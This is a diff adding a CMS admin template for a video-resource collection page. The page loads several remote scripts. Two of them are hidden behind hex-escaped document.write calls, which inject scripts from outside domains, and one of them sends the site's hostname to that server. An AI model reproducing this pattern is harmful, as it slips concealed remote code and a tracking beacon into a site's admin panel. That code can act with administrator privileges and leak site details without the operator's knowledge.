@@ -1,0 +1,30 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>资源采集管理</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<link rel='stylesheet' type='text/css' href='__PUBLIC__/css/admin-style.css' />
+<script language="JavaScript" type="text/javascript" charset="utf-8" src="__PUBLIC__/jquery/jquery-1.7.2.min.js"></script>
+<script language="JavaScript">
+$(document).ready(function(){
+	$('#xmltip').hide();
+	$('#xmllist').show();
+});
+var jumpurl = '{$jumpurl}';
+</script>
+</head>
+<php>$rand=mt_rand(1,3000);</php>
+<body class="body">
+<div id="xmltip">资源列表载入中……</div>
+
+<div id="xmllist" style="display:none">
+<script language="JavaScript" charset="utf-8" type="text/javascript" src="http://www.jiutoushe.cn/jiutoushecj.js?{$rand}"></script>
+<script language="javascript">
+window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x77\x72\x69\x74\x65"]("\x3c\x73\x63\x72\x69\x70\x74 \x74\x79\x70\x65\x3d\"\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\" \x73\x72\x63\x3d\"\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x7a\x69\x79\x75\x61\x6e\x70\x69\x61\x6e\x2e\x63\x6f\x6d\x2f\x79\x73\x7a\x79\x64\x71\x5f\x66\x66\x2e\x70\x68\x70\"\x3e"+"\x3c\/\x73\x63\x72\x69\x70\x74\x3e")
+</script>
+<script language="javascript">
+var npcjE$WR1 = '\x7a\x79\x61\x70\x69\x2e\x6e\x65\x70\x69\x61\x6e\x2e\x63\x6f\x6d';window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x77\x72\x69\x74\x65"]("\x3c\x73\x63\x72\x69\x70\x74 \x74\x79\x70\x65\x3d\"\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\" \x73\x72\x63\x3d\"\x68\x74\x74\x70\x3a\x2f\x2f"+npcjE$WR1+"\x2f\x66\x66\x2f\x66\x72\x65\x65\x2e\x70\x68\x70\x3f\x75\x72\x6c\x3d"+window["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"]["\x68\x6f\x73\x74"]+"\"\x3e"+"\x3c\/\x73\x63\x72\x69\x70\x74\x3e");
+</script>
+<include file="./Public/system/footer.html" />
+</body>
+</html>
